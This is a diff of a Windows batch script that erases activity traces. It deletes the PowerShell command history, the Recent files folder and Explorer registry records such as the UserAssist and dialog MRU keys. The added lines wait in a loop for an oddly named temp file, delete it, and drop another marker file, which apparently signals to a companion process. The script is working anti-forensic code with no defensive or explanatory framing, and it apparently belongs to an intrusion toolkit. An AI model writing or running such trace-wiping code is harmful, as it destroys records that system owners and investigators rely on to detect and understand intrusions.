@@ -1,3 +1,8 @@
+:loop
+if exist "%temp%\DX2_8121.tmp" goto ok
+goto loop
+:ok
+del /q /f %temp%\DX2_8121.tmp >nul 2>&1
 del /q /f %temp%\X7_0B2A.tmp >nul 2>&1
 del /q /f %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 del /f /q C:\Users\%username%\Recent\*.* >nul 2>&1
@@ -45,4 +50,5 @@ REG DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer
 REG DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" /f >nul 2>&1
 REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count" /f >nul 2>&1
 del /q /f %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+echo 0 > 7DAX_82AD.tmp >nul 2>&1
 exit
